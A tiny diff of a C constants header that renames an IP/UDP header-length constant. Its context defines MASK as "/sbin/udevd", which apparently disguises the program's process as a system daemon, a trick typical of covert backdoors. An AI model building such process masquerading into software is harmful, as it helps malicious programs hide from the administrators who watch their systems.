@@ -38,7 +38,7 @@ NOTES: This file holds the constants used throughout the program.
 #define MASK 	"/sbin/udevd"
 
 #define ETHER_IP_UDP_LEN 44
-#define IP_UDP_LEN 28
+#define IP_LEN 	  20
 #define LOCALHOST 0x0100007F
 
 #define MAX_LEN    4096
